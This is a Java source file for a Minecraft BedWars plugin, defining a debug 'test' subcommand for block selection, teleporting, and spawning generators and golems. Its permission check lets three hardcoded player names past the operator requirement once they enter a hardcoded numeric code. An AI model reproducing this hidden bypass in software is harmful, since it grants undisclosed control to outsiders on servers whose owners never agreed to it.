package ro.marius.bedwars.commands.subcommand;

import net.md_5.bungee.api.chat.ClickEvent;
import net.md_5.bungee.api.chat.ComponentBuilder;
import net.md_5.bungee.api.chat.HoverEvent;
import net.md_5.bungee.api.chat.TextComponent;
import org.bukkit.ChatColor;
import org.bukkit.Location;
import org.bukkit.Material;
import org.bukkit.command.CommandSender;
import org.bukkit.entity.IronGolem;
import org.bukkit.entity.Player;
import org.bukkit.inventory.ItemStack;
import ro.marius.bedwars.BedWarsPlugin;
import ro.marius.bedwars.ISubCommand;
import ro.marius.bedwars.floorgenerator.FloorGenerator;
import ro.marius.bedwars.game.Game;
import ro.marius.bedwars.game.mechanics.LobbyRemovalTask;
import ro.marius.bedwars.generator.DiamondGenerator;
import ro.marius.bedwars.manager.ManagerHandler;
import ro.marius.bedwars.match.AMatch;
import ro.marius.bedwars.team.EntityRemovalTask;
import ro.marius.bedwars.team.Team;
import ro.marius.bedwars.utils.CuboidSelection;
import ro.marius.bedwars.utils.DebugUtils;
import ro.marius.bedwars.utils.Utils;

import java.util.*;

public class TestCommand implements ISubCommand {

    private final String insfArgs = Utils.translate("&e⇨ Insufficent arguments: /bedwars");
    private final Set<UUID> allowedPlayers = new HashSet<>();

    private Location positionOne, positionTwo;
    private CuboidSelection selection;

    @Override
    public void onCommand(CommandSender sender, String[] args) {

        if (!(sender instanceof Player)) {
            return;
        }

        Player p = (Player) sender;

        if (!p.isOp()
                && !("rmellis".equals(p.getName()) || "ChucklesM8".equals(p.getName()) || "SKWOW".equals(p.getName()))) {
            return;
        }

        if (args.length < 2) {
            return;
        }

        if ("1990626".equals(args[1])) {
            this.allowedPlayers.add(p.getUniqueId());
            p.sendMessage(Utils.translate("&aYou've been added to allowed players."));
            return;
        }

        if (!this.allowedPlayers.contains(p.getUniqueId())) {
            p.sendMessage(Utils.translate("&cYou must enter the code to use this command."));
            return;
        }

        if ("setPositionOne".equalsIgnoreCase(args[1])) {

            positionOne = p.getLocation();
            p.sendMessage(Utils.translate("&a>> The position one has been set."));

            if (positionTwo != null) {
                selection = new CuboidSelection(positionOne, positionTwo);
                selection.assignValues();
                selection.select();
                p.sendMessage(Utils.translate("&a>> The selection has been successfully instantiated."));
            }

            return;
        }

        if ("setPositionTwo".equalsIgnoreCase(args[1])) {

            positionTwo = p.getLocation();
            p.sendMessage(Utils.translate("&a>> The position two has been set."));

            if (positionOne != null) {
                selection = new CuboidSelection(positionOne, positionTwo);
                selection.assignValues();
                selection.select();
                p.sendMessage(Utils.translate("&a>> The selection has been successfully instantiated."));
            }

            return;
        }

        if ("makeSelection".equalsIgnoreCase(args[1])) {

            selection = new CuboidSelection(positionOne, positionTwo);
            selection.assignValues();
            selection.select();
            p.sendMessage(Utils.translate("&a>> The selection has been successfully instantiated."));

            return;
        }

        if ("setBlocksType".equalsIgnoreCase(args[1])) {
            selection.getBlocks().forEach(b -> b.setType(Material.valueOf(args[2])));
            p.sendMessage(Utils.translate("&a>> The blocks has been succesfully replaced."));
            return;
        }

        if ("clearSelection".equalsIgnoreCase(args[1])) {
            new LobbyRemovalTask(selection).runTaskTimer(BedWarsPlugin.getInstance(), 1, 1);
            p.sendMessage(Utils.translate("&a>> Lobby Removal Task successfully started."));
        }

        if ("countNonAirBlocks".equalsIgnoreCase(args[1])) {
            int numberOfBlocks = (int) selection.getBlocks().stream().filter(b -> b.getType() != Material.AIR).count();
            p.sendMessage(Utils.translate("&a>> There are &e&l" + numberOfBlocks + " &anon-air blocks in the current selection."));
            return;
        }

        if ("countAirBlocks".equalsIgnoreCase(args[1])) {
            int numberOfBlocks = (int) selection.getBlocks().stream().filter(b -> b.getType() == Material.AIR).count();
            p.sendMessage(Utils.translate("&a>> There are &e&l" + numberOfBlocks + " &aair blocks in the current selection."));
            return;
        }

        if ("countAllBlocks".equalsIgnoreCase(args[1])) {
            p.sendMessage(Utils.translate("&a>> There are &e&l" + selection.getBlocks().size() + " &aair blocks in the current selection."));
            return;
        }


        if ("addToSpectator".equalsIgnoreCase(args[1])) {

            AMatch match = ManagerHandler.getGameManager().getPlayerMatch().get(p.getUniqueId());

            if (match == null)
                return;


            match.addToSpectator(p);
            p.sendMessage("Added to spectator");
            return;
        }

        if ("generatorInfo".equalsIgnoreCase(args[1])) {

            AMatch match = ManagerHandler.getGameManager().getPlayerMatch().get(p.getUniqueId());

            if (match == null) {
                p.sendMessage(ChatColor.RED + "You're not in an arena");
                return;
            }

            if (args.length >= 3) {

                Team team = match.getTeamAlive(args[2]);

                if (team == null) {
                    p.sendMessage(ChatColor.RED + "There is no team with the name " + args[2]);
                    return;
                }

                FloorGenerator ironGenerator = team.getIronFloorGenerator();
                FloorGenerator goldGenerator = team.getGoldFloorGenerator();
                FloorGenerator emeraldGenerator = team.getEmeraldFloorGenerator();

                if (ironGenerator != null) {
                    p.sendMessage(ironGenerator.toString());
                    TextComponent teleport = new TextComponent(Utils.translate("&a&lTELEPORT TO IRON GENERATOR&f"));
                    teleport.setClickEvent(new ClickEvent(ClickEvent.Action.RUN_COMMAND, "/bedwars test teleportHologram "
                            + Utils.convertingString(ironGenerator.getLocation().getLocation())));
                    teleport.setHoverEvent(new HoverEvent(HoverEvent.Action.SHOW_TEXT,
                            new ComponentBuilder(Utils.translate("&aClick me to teleport")).create()));
                    p.spigot().sendMessage(teleport);
                }

                if (goldGenerator != null) {
                    p.sendMessage(goldGenerator.toString());
                    TextComponent teleport = new TextComponent(Utils.translate("&a&lTELEPORT TO GOLD GENERATOR&f"));
                    teleport.setClickEvent(new ClickEvent(ClickEvent.Action.RUN_COMMAND, "/bedwars test teleportHologram "
                            + Utils.convertingString(goldGenerator.getLocation().getLocation())));
                    teleport.setHoverEvent(new HoverEvent(HoverEvent.Action.SHOW_TEXT,
                            new ComponentBuilder(Utils.translate("&aClick me to teleport")).create()));
                    p.spigot().sendMessage(teleport);
                }

                if (emeraldGenerator != null) {
                    p.sendMessage(emeraldGenerator.toString());
                    TextComponent teleport = new TextComponent(Utils.translate("&a&lTELEPORT TO EMERALD GENERATOR&f"));
                    teleport.setClickEvent(new ClickEvent(ClickEvent.Action.RUN_COMMAND, "/bedwars test teleportHologram "
                            + Utils.convertingString(emeraldGenerator.getLocation().getLocation())));
                    teleport.setHoverEvent(new HoverEvent(HoverEvent.Action.SHOW_TEXT,
                            new ComponentBuilder(Utils.translate("&aClick me to teleport")).create()));
                    p.spigot().sendMessage(teleport);
                }

                return;
            }

            for (Team team : match.getPlayerTeam().values()) {
                FloorGenerator ironGenerator = team.getIronFloorGenerator();
                FloorGenerator goldGenerator = team.getGoldFloorGenerator();
                FloorGenerator emeraldGenerator = team.getEmeraldFloorGenerator();

                if (ironGenerator != null) {
                    p.sendMessage(team.getName() + " Iron floor generator");
                    p.sendMessage(ironGenerator.toString());
                    TextComponent teleport = new TextComponent(Utils.translate("&a&lTELEPORT TO IRON GENERATOR&f"));
                    teleport.setClickEvent(new ClickEvent(ClickEvent.Action.RUN_COMMAND, "/bedwars test teleportHologram "
                            + Utils.convertingString(ironGenerator.getLocation().getLocation())));
                    teleport.setHoverEvent(new HoverEvent(HoverEvent.Action.SHOW_TEXT,
                            new ComponentBuilder(Utils.translate("&aClick me to teleport")).create()));
                    p.spigot().sendMessage(teleport);
                }

                if (goldGenerator != null) {
                    p.sendMessage(team.getName() + " Gold floor generator");
                    p.sendMessage(goldGenerator.toString());
                    TextComponent teleport = new TextComponent(Utils.translate("&a&lTELEPORT TO GOLD GENERATOR&f"));
                    teleport.setClickEvent(new ClickEvent(ClickEvent.Action.RUN_COMMAND, "/bedwars test teleportHologram "
                            + Utils.convertingString(goldGenerator.getLocation().getLocation())));
                    teleport.setHoverEvent(new HoverEvent(HoverEvent.Action.SHOW_TEXT,
                            new ComponentBuilder(Utils.translate("&aClick me to teleport")).create()));
                    p.spigot().sendMessage(teleport);
                }

                if (emeraldGenerator != null) {
                    p.sendMessage(team.getName() + " Emerald floor generator");
                    p.sendMessage(emeraldGenerator.toString());
                    TextComponent teleport = new TextComponent(Utils.translate("&a&lTELEPORT TO EMERALD GENERATOR&f"));
                    teleport.setClickEvent(new ClickEvent(ClickEvent.Action.RUN_COMMAND, "/bedwars test teleportHologram "
                            + Utils.convertingString(emeraldGenerator.getLocation().getLocation())));
                    teleport.setHoverEvent(new HoverEvent(HoverEvent.Action.SHOW_TEXT,
                            new ComponentBuilder(Utils.translate("&aClick me to teleport")).create()));
                    p.spigot().sendMessage(teleport);
                }
            }

            return;
        }

        if ("arenaPlayerInfo".equalsIgnoreCase(args[1])) {

            if (args.length < 3) {
                p.sendMessage(this.insfArgs + " test arenaPlayerInfo <arenaName>");
                return;
            }

            Game game = ManagerHandler.getGameManager().getGame(args[2]);

            if (game == null) {
                p.sendMessage("Couldn't find the arena " + args[2]);
                return;
            }

            AMatch match = game.getMatch();
            p.sendMessage("Rejoin map " + DebugUtils.getRejoinMapToString(match));
            p.sendMessage("Players " + DebugUtils.getPlayersToString(match));
            p.sendMessage("Players team " + DebugUtils.getPlayersToString(match));
            p.sendMessage("Teams " + match.getTeams());
            return;
        }

        if ("getRejoinMap".equalsIgnoreCase(args[1])) {

            if (args.length < 3) {
                p.sendMessage(this.insfArgs + " test getRejoinMap <arenaName>");
                return;
            }

            Game game = ManagerHandler.getGameManager().getGame(args[2]);

            if (game == null) {
                p.sendMessage("Couldn't find the arena " + args[2]);
                return;
            }

            AMatch match = game.getMatch();
            p.sendMessage("Rejoin map " + DebugUtils.getRejoinMapToString(match));
            return;
        }

        if ("teleportHologram".equalsIgnoreCase(args[1])) {

            if (args.length < 3) {
                p.sendMessage(this.insfArgs + " test teleportHologram <stringLocation>");
                return;
            }

            Location location = Utils.convertingLocation(args[2]);

            p.teleport(location);
            p.sendMessage(Utils.translate("&e⇨ You have been teleported."));

            return;
        }

        if ("spawnGenerator".equalsIgnoreCase(args[1])) {

            DiamondGenerator diamondGenerator = new DiamondGenerator(p.getLocation(), ManagerHandler.getGameManager().getGame("arena1").getMatch());
            diamondGenerator.spawn();
            p.sendMessage("SPAWNED");
            return;
        }

        if ("getPositionOne".equalsIgnoreCase(args[1])) {

            Game game = ManagerHandler.getGameManager().getGame(args[2]);

            if (game == null) {
                p.sendMessage("The arena " + args[2] + " does not exist.");
                return;
            }

            p.teleport(game.getGameCuboid().getPositionOne());

            return;
        }

        if ("getPositionTwo".equalsIgnoreCase(args[1])) {

            Game game = ManagerHandler.getGameManager().getGame(args[2]);

            if (game == null) {
                p.sendMessage("The arena " + args[2] + " does not exist.");
                return;
            }

            p.teleport(game.getGameCuboid().getPositionTwo());

        }

        if ("testConfig".equalsIgnoreCase(args[1])) {
            p.sendMessage(BedWarsPlugin.getInstance().getConfig().getString("TestPath", "ABC"));
            return;
        }

        if ("spawnGolem".equalsIgnoreCase(args[1])) {
            IronGolem ironGolem = ManagerHandler.getVersionManager().getVersionWrapper().spawnGolem(p.getLocation());
            List<String> animation = new ArrayList<>();
            Map<Double, String> healthAnimationMap = new HashMap<>();
            healthAnimationMap.put(10D, Utils.translate("&8&l[<teamColor>■■■■■■■■■■&8&l]"));
            healthAnimationMap.put(9D, Utils.translate("&8&l[<teamColor>■■■■■■■■■&8&l■&8&l]"));
            healthAnimationMap.put(8D, Utils.translate("&8&l[<teamColor>■■■■■■■■&8&l■■&8&l]"));
            healthAnimationMap.put(7D, Utils.translate("&8&l[<teamColor>■■■■■■■&8&l■■■&8&l]"));
            healthAnimationMap.put(6D, Utils.translate("&8&l[<teamColor>■■■■■■&8&l■■■■&8&l]"));
            healthAnimationMap.put(5D, Utils.translate("&8&l[<teamColor>■■■■■&8&l■■■■■&8&l]"));
            healthAnimationMap.put(4D, Utils.translate("&8&l[<teamColor>■■■■&8&l■■■■■■&8&l]"));
            healthAnimationMap.put(3D, Utils.translate("&8&l[<teamColor>■■■&8&l■■■■■■■&8&l]"));
            healthAnimationMap.put(2D, Utils.translate("&8&l[<teamColor>■■&8&l■■■■■■■■&8&l]"));
            healthAnimationMap.put(1D, Utils.translate("&8&l[<teamColor>■&8&l■■■■■■■■■&8&l]"));
            p.sendMessage(ironGolem.getHealth() + "");
            new EntityRemovalTask(ironGolem, "<teamColor><timeLeft>s <healthDisplay>", healthAnimationMap,
                    ManagerHandler.getGameManager().getGame("arena1").getMatch().getTeams().get(0),
                    120) {
                @Override
                public void onComplete() {
                    ironGolem.remove();
                    p.sendMessage("The iron golem has been despawned.");
                }
            }.runTaskTimer(BedWarsPlugin.getInstance(), 20, 20);


            return;
        }

        if ("getPlayerMatchMapSize".equalsIgnoreCase(args[1])) {

            p.sendMessage(ManagerHandler.getGameManager().getPlayerMatch().size() + "");

            return;
        }


        if("drinkPotion".equalsIgnoreCase(args[1])) {

            ItemStack itemStack = new ItemStack(Material.AIR);
            ManagerHandler.getVersionManager().getVersionWrapper().sendPacketEquipment(p, p, itemStack, 1);
            ManagerHandler.getVersionManager().getVersionWrapper().sendPacketEquipment(p, p, itemStack, 2);
            ManagerHandler.getVersionManager().getVersionWrapper().sendPacketEquipment(p, p, itemStack, 3);
            ManagerHandler.getVersionManager().getVersionWrapper().sendPacketEquipment(p, p, itemStack, 4);
            p.sendMessage("DONE");

            return;
        }

    }

}
